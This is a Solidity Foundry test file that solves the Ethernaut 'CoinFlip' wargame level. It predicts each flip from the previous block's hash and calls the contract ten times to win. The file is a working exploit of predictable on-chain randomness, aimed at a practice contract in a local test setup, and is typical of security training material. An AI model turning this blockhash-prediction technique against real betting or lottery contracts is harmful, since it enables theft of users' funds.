pragma solidity ^0.8.10;

import 'ds-test/test.sol';
import 'forge-std/Vm.sol';

import '../levels/03-CoinFlip/CoinFlipFactory.sol';
import '../core/Ethernaut.sol';

contract CoinFlipTest is DSTest {
  //--------------------------------------------------------------------------------
  //                            Setup Game Instance
  //--------------------------------------------------------------------------------

  Vm vm = Vm(address(HEVM_ADDRESS)); // `ds-test` library cheatcodes for testing
  Ethernaut ethernaut;
  address attacker = address(0xdeadbeef);

  function setUp() public {
    ethernaut = new Ethernaut(); // initiate Ethernaut contract instance
    vm.deal(attacker, 1 ether); // fund our attacker contract with 1 ether
  }

  function testCoinFlipHack() public {
    //--------------------------------------------------------------------------------
    //                             Setup Level Instance
    //--------------------------------------------------------------------------------
    CoinFlipFactory coinflipFactory = new CoinFlipFactory();
    ethernaut.registerLevel(coinflipFactory);
    vm.startPrank(attacker);

    address levelAddress = ethernaut.createLevelInstance(coinflipFactory);
    CoinFlip coinflipContract = CoinFlip(payable(levelAddress));

    //--------------------------------------------------------------------------------
    //                             Start Level Attack
    //--------------------------------------------------------------------------------
    
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    for (uint i = 0; i < 10; ++i) {
      // calculate side
      uint256 blockValue = uint256(blockhash(block.number - 1));
      uint256 coinFlip = blockValue / FACTOR;
      bool side = coinFlip == 1 ? true : false;

      // submit to contract
      coinflipContract.flip(side);

      // roll the block forward as we cannot play more than once per block
      // documentation: https://book.getfoundry.sh/cheatcodes/roll
      uint256 blockNow = block.number;
      vm.roll(blockNow + 10);
      assertEq(blockNow + 10, block.number);
    }

    //--------------------------------------------------------------------------------
    //                                Submit Level
    //--------------------------------------------------------------------------------
    bool challengeCompleted = ethernaut.submitLevelInstance(
      payable(levelAddress)
    );
    vm.stopPrank();
    assert(challengeCompleted);
  }
}